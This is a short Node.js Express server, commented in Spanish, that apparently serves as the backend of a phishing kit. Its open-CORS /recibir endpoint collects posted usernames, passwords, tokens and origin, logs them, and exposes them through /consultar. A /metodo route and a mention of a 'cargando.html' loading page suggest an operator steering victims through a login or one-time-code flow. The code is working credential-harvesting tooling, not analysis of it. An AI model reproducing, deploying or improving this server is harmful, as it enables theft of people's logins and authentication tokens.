const express = require('express');
const cors = require('cors'); 
const app = express();

app.use(cors()); 
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

let baseDeDatosTemporal = {
    user: null,
    pass: null,
    token: null,
    origen: null,
    actualizado: false,
    metodo: null 
};

app.post('/recibir', (req, res) => {
    const data = req.body;

    // --- LA SOLUCIÓN ESTÁ AQUÍ ---
    // Solo actualiza si el dato NO es null o undefined
    if (data.nombre || data.user) {
        baseDeDatosTemporal.user = data.nombre || data.user;
    }
    
    if (data.contra || data.pass) {
        baseDeDatosTemporal.pass = data.contra || data.pass;
    }

    if (data.metodo) {
        baseDeDatosTemporal.metodo = data.metodo;
    }

    if (data.origen) {
        baseDeDatosTemporal.origen = data.origen;
    }

    if (data.token) {
        baseDeDatosTemporal.token = data.token;
    }
    // ------------------------------

    baseDeDatosTemporal.actualizado = true;

    console.log("Caja de datos actualizada:", baseDeDatosTemporal);
    res.status(200).send("OK");
});

// Ruta espejo para los botones (por si tu cargando.html apunta a /metodo)
app.post('/metodo', (req, res) => {
    if (req.body.metodo) {
        baseDeDatosTemporal.metodo = req.body.metodo;
        baseDeDatosTemporal.actualizado = true;
    }
    res.status(200).send("OK");
});

app.get('/consultar', (req, res) => {
    res.json(baseDeDatosTemporal);
});

app.post('/limpiar', (req, res) => {
    baseDeDatosTemporal = { user: null, pass: null, token: null, origen: null, actualizado: false, metodo: null };
    res.status(200).send("Limpiado");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => { console.log(`Puerto ${PORT}`); });
